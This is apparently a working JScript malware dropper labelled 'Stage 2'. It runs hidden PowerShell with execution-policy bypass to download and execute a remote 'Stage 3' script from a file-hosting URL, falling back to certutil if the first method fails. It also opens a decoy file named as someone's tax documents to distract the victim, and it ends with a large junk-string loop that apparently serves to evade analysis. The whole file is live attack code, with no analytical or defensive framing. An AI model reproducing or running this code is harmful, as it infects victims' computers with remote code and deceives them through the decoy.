// =============================================
// Ultra Reliable Stage 2 - Direct Execution
// =============================================

(function() {
    try {
        var wsh = new ActiveXObject("WScript.Shell");

        // Your Stage 3 URL
        var url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";

        // Most reliable method (using bitsadmin + certutil fallback)
        var cmd = '-ep Bypass -WindowStyle Hidden -c "' +
                  'try { irm \'' + url + '\' | iex } catch { ' +
                  'certutil -urlcache -split -f \'' + url + '\' %temp%\\s.ps1 && powershell -ep bypass %temp%\\s.ps1 }' +
                  '"';

        wsh.Run("powershell.exe " + cmd, 0, false);

        // Decoy
        WScript.Sleep(800);
        var decoy = '-ep Bypass -WindowStyle Hidden -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'; Start-Process \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'"';
        wsh.Run("powershell.exe " + decoy, 0, false);

    } catch(e) {}

    // Junk
    var junk = "";
    for(var i = 0; i < 9200000; i++) junk += "x";
})();